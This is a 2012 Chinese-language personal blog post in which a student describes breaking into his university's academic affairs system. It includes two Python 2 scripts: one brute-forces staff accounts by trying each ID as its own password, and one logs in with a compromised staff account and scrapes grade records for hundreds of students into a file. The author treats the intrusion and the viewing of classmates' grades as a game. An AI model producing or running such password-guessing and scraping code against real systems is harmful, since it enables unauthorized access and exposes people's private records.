+++
author = "admin"
date = "2012-07-04T16:14:02Z"
slug = "2012/07/04/e7bd91e7bb9ce694bbe998b2e4b88epython"
title = "网络攻防与Python"
Categories = ["IT", "Life", "njust", "Python"]
Tags = ["life", "njust", "python", "黑客"]
+++

上个学期学《网络攻防》，《信息安全》。发现自己对网络攻防、信息安全这方面内容还真的挺感兴趣的。
说来也是，学计算机的，谁小时候没有一个黑客梦呢！





然后就开始研究了啊。趁着有兴趣的时候。





先去搞了CSDN的500万密码，然后开始把密码删选，把最常出现的几千个搞出来，然后跟崔嵬学习了一下对网站结构的分析之类的。再然后就发现了，还是学校教务处网站比较简单，哈哈，就拿学校教务处网站开工练手了。





记得第一个爆出密码来的同学是一个女生，成绩非常好，名字也挺好的，跟小说《诛仙》里一个人物的名相同，后来还认识了，算是挺有缘分的~哈哈~~





当时先是把所有学号和密码相同的同学爆了一遍，后来发现不过瘾，把生日密码来尝试了一下，再后来就发现，这样一个一个爆密码实在太慢了。而且当时跟崔嵬学的是用java这个语言来做网络尝试登录，暴力破解密码，java的速度本来就比较慢。





接下来沉寂了大概一两周，但是心里一直想着这个事情，就不停的学这方面内容了。





再后来，通过别的同学，就知道了很多信息和内容。
就换了一种方式，知道了要爆教务处管理人员的账号和密码，这样的话，一下子就可以查询到所有同学的信息了。
然后语言也换成了黑客界的基本常用语言——python，这下，瞬间有种鸟枪换炮的感觉了啊。





这是暴力教务处账号和密码的python脚本。出于对学校的尊重，这里把登录网址删掉了。




{% codeblock %}

import time
import urllib2
import urllib
import re

print "Loading…."
cookies = urllib2.HTTPCookieProcessor()
opener = urllib2.build_opener(cookies)
urllib2.install_opener(opener)

print "Loading…."

stu = [];
for bj in range(10000,14000) :
fm = ""
if bj<10:
fm = "0000%d"%(bj)
elif bj<100:
fm = "000%d"%(bj)
elif bj<1000:
fm = "00%d"%(bj)
else :
fm = "0%d"%(bj)
stu.append(fm)

digs = re.compile(‘

#### 姓名：(.*)，单位：(.*)，职称：(.*)

  
’)

for i in range(1,4000):
params = {‘stuid’:stu[i],’pwd’:stu[i]}
loginUrl = ‘http://管理人员登录网址’
login = urllib2.urlopen(loginUrl,urllib.urlencode(params))
while(True):
var = login.readline()
a = digs.match(var)
if a is not None :
print stu[i],
print a.group(1),
print a.group(2),
print a.group(3)
if var == "":break;
if i%300 == 0:
print "%d finished"%(i)
print "all scan finished"

{% endcodeblock %}




然后果然爆出来一大批懒得改密码的老师的账号。





接下来就用这些账号登录啦。有了这些账号后，几乎大部分同学的学习成绩信息都能知道了，当然，我只是为了好玩，真正看了信息的，也没几个。





然后就做了一个抓网页的代码，算是练练手，多写写python




{% codeblock %}

# -*- coding: cp936 -*-
import time
import urllib2
import urllib
import re

print "Loading…."
cookies = urllib2.HTTPCookieProcessor()
opener = urllib2.build_opener(cookies)
urllib2.install_opener(opener)
params = {‘stuid’:'账号’,'pwd’:'密码’}
loginUrl = ‘http://管理员登录网址’
login = urllib2.urlopen(loginUrl,urllib.urlencode(params))
var = login.read();
#print var

loginUrl = ‘成绩查询的网址’

stu = [];
for bj in range(1,7) :
for stuid in range(1,51) :
fm = "查询学号的前缀%d"%(bj)
if stuid<10 :
fm = "%s0%d"%(fm,stuid)
else:
fm = "%s%d"%(fm,stuid)
stu.append(fm)

#jd = re.compile(”’目前该生所有已修课程的平均学分绩点：(.*)”’)
digs = re.compile(”’<tr >(.*\n.*)
<td bgcolor="#eeeeee" align="center" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="63" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="68" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="219" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="35" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="52" >(.*)
</td>(.*\n.*)
<td bgcolor="#eeeeee" align="center" width="56" >(.*)
</td>(.*\n.*)</tr>”’)

fileHandle = open (’09.txt’, ‘w’)
for i in range(0,300) :
params = {‘p_xh’:stu[i]}
login = urllib2.urlopen(loginUrl,urllib.urlencode(params))
var = login.read();
# b = jd.match(var)
# fileHandle.write("%s\n"%(b.group(1)))
a = digs.findall(var)
l = len(a)
for pi in range(0,l):
for j in range(1,8):
fileHandle.write(a[pi][2*j-1]+" ")
fileHandle.write("\n")
print stu[i]+"SUCCEED"
fileHandle.close()

{% endcodeblock %}




然后就到此收手了。





最后其实挺诧异的，网络攻防和信息安全这么好玩的两门课，最后考试的内容，竟然是背书，真的掉了一地的眼镜啊。
然后就背啊背啊，一直背到考试。
那天考试的时候肚子疼，写了四十分钟，该写的也都写出来了，正好交了卷出去上厕所。只记得交卷的时候，背后一片“卧槽”的声音，不知道是想表达什么。。。
然后我后来才知道，等我交了卷以后，教我们的老师就开始“黑”我了，说是这个同学考的非常差，估计要过都危险。
我还能说什么呢？最后成绩出来确实不高，78。另外一门信息安全79.5。唉，都是蛋疼的分数。
也罢，本来大学里嘛，学学玩玩，七八十分也就够了。
但是可惜的是，这么好玩的课，考试的时候本不该这么庸俗的，这里可是大学啊！
要是最后考试的内容是让大家一起来做个带数据库的网站，互相攻击，看获取的信息量和防御了多少强度的攻击来作为考核，那该多好玩啊。
这样也可以让我这样的“估计过都危险”的底分户，跟比我高的那些大牛们交流学习一番啊。
这么好的机会，可惜了。。。
唉！我的njust~



